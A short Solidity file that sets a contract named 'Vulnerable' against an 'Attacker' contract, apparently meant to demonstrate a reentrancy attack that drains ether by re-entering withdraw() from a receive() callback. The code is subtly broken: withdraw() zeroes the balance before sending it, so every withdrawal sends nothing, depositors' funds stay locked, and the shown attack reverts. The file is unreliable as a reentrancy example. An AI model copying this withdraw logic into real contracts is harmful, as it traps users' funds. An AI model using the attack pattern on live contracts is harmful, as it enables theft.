//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient balance");
        
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");
    }
}

contract Attacker {
    Vulnerable private vulnerableContract;

    constructor(Vulnerable _contract) {
        vulnerableContract = Vulnerable(_contract);
    }

    receive() external payable {
        if(address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }

    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }
}